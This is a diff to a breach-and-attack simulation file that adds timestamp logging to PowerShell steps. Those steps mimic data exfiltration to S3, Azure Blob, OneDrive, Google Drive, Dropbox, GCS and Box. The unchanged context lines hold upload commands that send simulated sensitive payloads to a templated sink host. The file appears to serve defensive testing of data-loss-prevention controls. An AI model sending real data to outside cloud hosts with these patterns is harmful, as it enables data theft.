@@ -74,6 +74,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/s3/bas-sim-bucket/$token.dat"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Put -Body $csvContent `
           -Headers @{ 'x-amz-content-sha256' = 'UNSIGNED-PAYLOAD'; 'x-amz-date' = (Get-Date).ToUniversalTime().ToString('yyyyMMddTHHmmssZ') } `
           -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
@@ -117,6 +118,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/azureblob/bas-sim-container/$token.dat"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Put -Body $csvContent `
           -Headers @{ 'x-ms-version' = '2021-08-06'; 'x-ms-blob-type' = 'BlockBlob' } `
           -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
@@ -156,6 +158,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/graph/v1.0/me/drive/root:/$token.dat:/content"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Put -Body $csvContent -ContentType 'text/plain' -TimeoutSec 10 | Out-Null
         Write-Output "DLP_OBSERVATION: onedrive_put_result=success"
         Write-Output "EXEC T1567.002: OneDrive-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-ONEDRIVE]"
@@ -206,6 +209,7 @@ steps:
       ) -join "`r`n"
       $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/gdrive/upload/drive/v3/files"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $bodyLines -ContentType "multipart/related; boundary=$boundary" -TimeoutSec 10 | Out-Null
         Write-Output "DLP_OBSERVATION: gdrive_upload_result=success"
         Write-Output "EXEC T1567.002: Google Drive-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-GDRIVE]"
@@ -244,6 +248,7 @@ steps:
       $apiArg = "{`"path`":`"/$token.dat`",`"mode`":`"add`"}"
       $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/dropbox/2/files/upload"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $csvContent `
           -Headers @{ 'Dropbox-API-Arg' = $apiArg } -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
         Write-Output "DLP_OBSERVATION: dropbox_upload_result=success"
@@ -282,6 +287,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/gcs/upload/storage/v1/b/bas-sim-bucket/o?uploadType=media&name=$token.dat"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $csvContent -ContentType 'text/plain' -TimeoutSec 10 | Out-Null
         Write-Output "DLP_OBSERVATION: gcs_upload_result=success"
         Write-Output "EXEC T1567.002: Google Cloud Storage-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-GCS]"
@@ -333,6 +339,7 @@ steps:
       ) -join "`r`n"
       $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/box/2.0/files/content"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $bodyLines -ContentType "multipart/form-data; boundary=$boundary" -TimeoutSec 10 | Out-Null
         Write-Output "DLP_OBSERVATION: box_upload_result=success"
         Write-Output "EXEC T1567.002: Box-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-BOX]"
@@ -370,6 +377,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/s3/bas-sim-bucket/$token.dat"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Put -Body $payload `
           -Headers @{ 'x-amz-content-sha256' = 'UNSIGNED-PAYLOAD'; 'x-amz-date' = (Get-Date).ToUniversalTime().ToString('yyyyMMddTHHmmssZ') } `
           -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
@@ -409,6 +417,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/azureblob/bas-sim-container/$token.dat"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Put -Body $payload `
           -Headers @{ 'x-ms-version' = '2021-08-06'; 'x-ms-blob-type' = 'BlockBlob' } `
           -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
@@ -461,6 +470,7 @@ steps:
       ) -join "`r`n"
       $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/gdrive/upload/drive/v3/files"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $bodyLines -ContentType "multipart/related; boundary=$boundary" -TimeoutSec 10 | Out-Null
         Write-Output "DLP_OBSERVATION: gdrive_upload_result=success"
         Write-Output "EXEC T1567.002: C#-source-code-shaped Google Drive traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-GDRIVE]"
@@ -498,6 +508,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/graph/v1.0/me/drive/root:/$token.dat:/content"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Put -Body $payload -ContentType 'text/plain' -TimeoutSec 10 | Out-Null
         Write-Output "DLP_OBSERVATION: onedrive_put_result=success"
         Write-Output "EXEC T1567.002: Partnership-agreement-shaped OneDrive traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-ONEDRIVE]"
